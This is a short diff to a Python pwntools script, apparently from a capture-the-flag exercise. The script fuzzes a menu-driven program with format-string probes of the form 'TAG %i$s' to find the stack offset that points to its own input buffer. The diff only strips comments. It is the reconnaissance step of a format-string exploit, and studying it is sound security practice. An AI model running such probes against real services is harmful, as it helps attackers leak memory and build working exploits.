@@ -9,13 +9,11 @@ def fuzz():
             p.recvuntil(b'> ')
             p.sendline(b'1')
             p.recvuntil(b'Transmit data: ')
-            
-            # Send probe with marker
-            # Use 'TAG ' to verify content
+
             p.sendline(f'TAG %{i}$s'.encode())
             
             p.recvuntil(b'The archives echo back: ')
-            result = p.recvline() #.strip().decode()
+            result = p.recvline() 
             if b'TAG TAG ' in result:
                 print(f'FOUND POINTER TO BUF AT: {i}')
             p.close()
